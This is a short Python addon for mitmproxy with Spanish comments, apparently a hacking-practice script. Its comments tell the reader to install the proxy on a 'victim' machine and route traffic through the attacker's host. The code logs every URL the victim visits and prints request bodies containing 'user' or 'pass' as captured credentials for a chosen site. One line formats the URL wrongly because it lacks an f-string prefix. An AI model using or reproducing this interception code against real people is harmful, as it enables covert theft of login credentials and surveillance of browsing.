#!/usr/bin/env python3

#Pasos para sniffear paquetes https con mitmproxy 
#Instalar mitmproxy en maquina victima y activar proxy con la ip de nuestra maquina y el puerto 8080
#Ejecutar ./mitmweb, ./mitmproxy o ./mitmdump

from mitmproxy import http 
from urllib.parse import urlparse

def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):

    url = packet.request.url 
    parsed_url = urlparse(url) #
    scheme = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path

    url_visitada=  "{scheme}://{domain}{path}"

    print(f"\n URL visitada por la victima: {url_visitada}\n")

    keywords = ["user", "pass"] #son palabras que buscamos en el texto del paquete interceptado, se puede modificar a gusto
    data = packet.request.get_text() #Obtenemos todo el texto del paquete interceptado
    
    if "xxxx" in packet.request.url: #con el condicional buscamos si en data se encuentra la cadena mencionada (pagina web interesada en ver credenciales)
        if has_keywords(data, keywords):
            print(f"\n Posibles credenciales capturadas:\n\n{data}\n")
    
